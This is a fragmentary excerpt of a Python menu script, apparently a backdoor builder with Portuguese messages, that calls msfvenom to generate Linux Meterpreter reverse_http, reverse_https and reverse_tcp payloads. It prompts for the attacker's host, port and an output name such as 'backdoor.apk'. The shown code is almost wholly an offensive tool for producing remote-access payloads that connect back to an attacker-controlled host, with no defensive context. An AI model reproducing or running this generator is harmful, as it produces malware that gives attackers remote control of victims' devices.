...
[99] - Exit ❌️	
	...
	if cmd == '1':
		...
		system(f'msfvenom -p linux/meterpreter/reverse_http LHOST={ip} LPORT={port} R > {name}')
		...
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p linux/meterpreter/reverse_https LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')
		...
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p linux/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')
	elif cmd == '99':
